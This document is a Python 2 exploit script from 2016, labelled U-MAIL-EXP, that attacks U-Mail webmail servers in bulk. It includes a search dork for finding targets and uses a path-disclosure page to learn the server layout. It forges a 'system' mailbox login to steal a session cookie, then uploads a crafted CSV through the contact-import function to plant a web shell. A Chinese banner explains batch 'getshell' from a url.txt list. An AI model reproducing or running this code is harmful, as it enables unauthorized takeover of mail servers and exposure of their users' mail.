# -*-coding:utf-8-*-
# By Nan3r 2016.4.2
# inurl:cn+"Powered+by+U-Mail"  intext:Powered by U-Mail
import re

import string

import requests

import time

import sys
reload(sys)
sys.setdefaultencoding('utf8')

#get web source
def getHtml(url):
	html = requests.get(getNormalUrl(url))
	if html != '':
		return html.text
		pass
	else:
		return ''
	pass

#get True Url Format
def getNormalUrl(url):
	searchpath = re.compile('^http://').search
	result = searchpath(url)
	if not result:
		url = 'http://'+url
		pass
	return url
	pass

#get web path
def getWebPath(url):
	html = getHtml(url + '/webmail/client/mail/module/test.php')
	relist = re.findall(r'in <b>(.*?)client\\mail\\module\\test.php<\/b> on', html)
	if relist:
		print getNowTime()+' [*]'+relist[0]
		pan = relist[0][0]
		searchpath = re.compile('^mail$').search
		if searchpath(pan):
			pan = pan+'mail'
		return pan
	else:
		return ''




def getEmailAddr(url):
	html = getHtml(url+'/webmail/login9.php')
	if html:
		email = re.findall(r'<strong style="letter-spacing:1px;">(.*?)</strong>', html)
		if email:
			st = re.search(r'@(?:[A-Za-z0-9]+\.)+[A-Za-z]+', email[0])
			if st:
				return st.group(0)
			else:
				return ''
		else:
			return ''
	else:
		return ''


def getSession(url):
	emailaddr = getEmailAddr(url)
	if emailaddr != '':
		data = {'mailbox':'system'+getEmailAddr(url), 'link':'abc'}
		url = getNormalUrl(url)+'/webmail/fast/index.php?module=operate&action=login'
		response = requests.post(url, data=data)
		if response:
			session = re.findall('PHPSESSID=(.*?);', response.headers.get('set-cookie'))
			return 'PHPSESSID='+session[0]
			pass
		else:
			return ''
	else:
		return ''

def exp(url, session, webpath):
	url1 = getNormalUrl(url)+'/webmail/fast/pab/index.php?module=operate&action=contact-import'
	pathdic = {'c' : 'c.csv', 'd' : 'd.csv','e' : 'e.csv','f' : 'f.csv','g' : 'g.csv','h' : 'h.csv', 'dmail' : 'dmail.csv'
	, 'cmail' : 'cmail.csv', 'email' : 'email.csv', 'fmail' : 'fmail.csv'}
	filepath = 'E:/HACK/tools/EXP/python/u-mail/'+pathdic[webpath.lower()]
	headers = {
	'Host': getNormalUrl(url).replace('http://', ''),
	# 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Cookie': session
	# 'Connection': 'keep-alive'
	}

	files = {
		'import_file': ('getshell.csv', open(filepath, 'rb'), 'application/vnd.ms-excel'),
		'import_mode': 'ignore'
	}

	r = requests.post(url1, files=files, headers=headers)
	# r.encoding = 'utf-8'
	# print r.text
	pass

def getNowTime():
	return "["+time.strftime('%H:%M:%S',time.localtime(time.time()))+"]"


if __name__ == '__main__':

	OUT = u'''
**************************************************************************
**************************************************************************
**                                                                      **
**                            U-MAIL-EXP                                **
**                                                      --BY Nan3r      **
**                                                           2016.4.2   **
**************************************************************************
**************************************************************************
--------------------------------------------------------------------------
1.这个exp有一些bug。但是大概能用.........我实在不想搞那些小bug了浪费时间.
2.把url放入同一个文件夹下的url.txt中，就可以批量getshell了，过程中可能会
直接蹦掉，你就要将那个导致蹦掉的url删了，再重新开始......
3.有些虽然把shell地址打印出来了，但是可能是404，我也没有看原因了，因为我
测试下来很少碰到所以也没有管了...
-------------------------------------------------------------------------
	'''
	print OUT
	urltxt = open('url.txt', 'r')
	for url in urltxt:
		url = url.strip('\n')
		webpath = getWebPath(url)
		session = getSession(url)

		if webpath == '' or session == '':
			print getNowTime()+' [*]Error,Maybe It have not this leak,Please do it by yourself!'
			pass
		elif len(webpath) == 5 and webpath != 'dmail' and webpath != 'cmail' and webpath != 'email' and webpath != 'fmail':
			print getNowTime()+' [*]web path wrong,Please try again.'
		else:
			exp(url, session, webpath)
			print getNowTime()+' [*]ShellUrl: '+getNormalUrl(url)+'/webmail/logincn.php'
